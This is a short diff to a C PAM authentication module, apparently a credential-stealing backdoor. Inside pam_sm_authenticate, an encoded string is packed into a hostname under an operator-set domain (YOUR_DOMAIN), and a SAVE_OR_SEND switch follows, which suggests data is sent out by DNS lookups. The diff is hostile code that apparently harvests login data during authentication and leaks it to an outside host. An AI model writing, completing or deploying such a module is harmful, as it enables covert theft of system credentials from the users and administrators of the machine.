@@ -176,7 +176,7 @@ pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv )
 
      encoded_string = modify_result(encoded_string);
 
-     snprintf(bonus, sizeof(bonus), "%d.%s.com", count,encoded_string); 
+     snprintf(bonus, sizeof(bonus), "%d.%s%s", count,encoded_string,YOUR_DOMAIN); 
     
      if (SAVE_OR_SEND)
      {
